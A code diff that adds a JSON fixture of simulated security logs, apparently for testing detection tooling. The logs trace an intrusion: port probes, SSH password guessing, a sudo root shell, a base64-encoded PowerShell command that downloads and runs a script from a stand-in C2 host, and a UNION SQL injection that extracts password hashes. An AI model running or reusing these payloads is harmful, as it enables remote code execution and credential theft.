@@ -1,0 +1,101 @@
+[
+  {
+    "timestamp": "2026-09-17T11:00:01Z",
+    "source_type": "network",
+    "src_ip": "203.0.113.50",
+    "dst_ip": "10.0.0.5",
+    "port": 22,
+    "protocol": "TCP",
+    "flags": "SYN",
+    "message": "TCP SYN connection attempt to port 22"
+  },
+  {
+    "timestamp": "2026-09-17T11:00:02Z",
+    "source_type": "network",
+    "src_ip": "203.0.113.50",
+    "dst_ip": "10.0.0.5",
+    "port": 80,
+    "protocol": "TCP",
+    "flags": "SYN",
+    "message": "TCP SYN connection attempt to port 80"
+  },
+  {
+    "timestamp": "2026-09-17T11:00:03Z",
+    "source_type": "network",
+    "src_ip": "203.0.113.50",
+    "dst_ip": "10.0.0.5",
+    "port": 443,
+    "protocol": "TCP",
+    "flags": "SYN",
+    "message": "TCP SYN connection attempt to port 443"
+  },
+  {
+    "timestamp": "2026-09-17T11:01:01Z",
+    "source_type": "system",
+    "src_ip": "203.0.113.50",
+    "username": "admin",
+    "event_id": 4625,
+    "action": "login",
+    "status": "failed",
+    "message": "Failed password for admin from 203.0.113.50 port 54321 ssh2"
+  },
+  {
+    "timestamp": "2026-09-17T11:01:03Z",
+    "source_type": "system",
+    "src_ip": "203.0.113.50",
+    "username": "admin",
+    "event_id": 4625,
+    "action": "login",
+    "status": "failed",
+    "message": "Failed password for admin from 203.0.113.50 port 54322 ssh2"
+  },
+  {
+    "timestamp": "2026-09-17T11:01:05Z",
+    "source_type": "system",
+    "src_ip": "203.0.113.50",
+    "username": "root",
+    "event_id": 4625,
+    "action": "login",
+    "status": "failed",
+    "message": "Failed password for root from 203.0.113.50 port 54323 ssh2"
+  },
+  {
+    "timestamp": "2026-09-17T11:01:07Z",
+    "source_type": "system",
+    "src_ip": "203.0.113.50",
+    "username": "admin",
+    "event_id": 4624,
+    "action": "login",
+    "status": "accepted",
+    "message": "Accepted password for admin from 203.0.113.50 port 54325 ssh2"
+  },
+  {
+    "timestamp": "2026-09-17T11:01:10Z",
+    "source_type": "system",
+    "src_ip": "203.0.113.50",
+    "username": "admin",
+    "process": "sudo",
+    "command": "/bin/bash",
+    "target_user": "root",
+    "message": "sudo: admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/bash"
+  },
+  {
+    "timestamp": "2026-09-17T11:01:15Z",
+    "source_type": "system",
+    "src_ip": "203.0.113.50",
+    "username": "root",
+    "process": "bash",
+    "command": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAdwBhAHIAZQAuAGMAbwBtAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+    "message": "Suspicious base64 encoded PowerShell execution downloading remote payload"
+  },
+  {
+    "timestamp": "2026-09-17T11:02:01Z",
+    "source_type": "application",
+    "src_ip": "203.0.113.50",
+    "method": "POST",
+    "url": "/api/database/query",
+    "status": 200,
+    "body": "1' UNION SELECT username,password_hash FROM sys_users--",
+    "message": "SQL Injection exploitation post-compromise"
+  }
+]
